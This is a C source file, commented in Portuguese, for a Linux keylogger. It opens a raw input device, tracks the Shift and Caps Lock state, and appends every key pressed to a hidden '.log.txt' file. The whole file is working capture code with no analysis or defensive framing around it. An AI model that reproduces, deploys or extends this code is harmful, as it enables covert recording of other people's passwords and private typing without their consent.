#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include "keymap.h"
#include <linux/input.h>
#include <sys/ioctl.h>

#define BITS_PER_LONG (8 * sizeof(long))
//Define quantos bits tem no long na arquitetura atual, no meu caso 64 bits 8*8
#define NBITS(x) ((((x) - 1) / BITS_PER_LONG) + 1) 
//Calcula quantos elementos do tipo long são necessários para armazenar x bits.
#define IS_BIT_SET(bit, array) ((array[(bit) / BITS_PER_LONG] >> ((bit) % BITS_PER_LONG)) & 1)

const char *device = "/dev/input/event6";

int
caps_status() {
    int fd = open(device, O_RDONLY);
    if (fd < 0) return -1;

    unsigned long led_bits[NBITS(LED_CNT)];
    
    // Verifica o ioctl corretamente passando led_bits como 3º argumento
    if (ioctl(fd, EVIOCGLED(sizeof(led_bits)), led_bits) < 0) {
        close(fd); // Fecha o fd em caso de erro
        return -1;
    }

    // Salva o status, fecha o arquivo e retorna
    int status = IS_BIT_SET(LED_CAPSL, led_bits);
    close(fd);
    
    return status;
}

bool caps_lock_on;
bool shift_pressed = false;

int
main(int argc, char** argv) {   
//    int status = caps_status(); 
//    if(status < 0) return - 1;
//  caps_lock_on = (bool)status;

    struct input_event ev;
    int fd = open(device, O_RDONLY);
    if(fd < 0) return - 1;
    
    int log_fd = open(".log.txt", O_WRONLY | O_APPEND | O_CREAT);
    if(log_fd < 0) return - 1;

  while(1) {
                int status = caps_status();
                if(status < 0) return -1;
                caps_lock_on = (bool)status;

        ssize_t bytes = read(fd, &ev, sizeof(ev));
        
        if(ev.type == EV_LED && ev.code == LED_CAPSL && ev.value == 1) caps_lock_on = !caps_lock_on;
            
        if(ev.value == 1) { //capturar apenas um shift
            if(ev.code == KEY_LEFTSHIFT || ev.code ==  KEY_RIGHTSHIFT) shift_pressed = true;
        }   
                if(ev.value == 0) { //capturar apenas um shift
            if(ev.code == KEY_LEFTSHIFT || ev.code ==  KEY_RIGHTSHIFT) shift_pressed = false;
        }        
      
        bool should_uppercase = (shift_pressed != caps_lock_on); //XOR logic
  
        if(ev.type == EV_KEY && ev.value == 1) {
            const char *key = key_code_names[ev.code];
            if(!key) key = "?";
            
            char _key[strlen(key) + 1];
            strcpy(_key, key);

            if(!should_uppercase) {
                int i = 0;
                while(_key[i] != '\0') {
                    _key[i] = tolower(_key[i]);
                    i++;
                }
            }
            ssize_t bytes_log = write(log_fd, _key, strlen(_key));
        }
    }

    close(fd);
    close(log_fd);
        return 0;
}
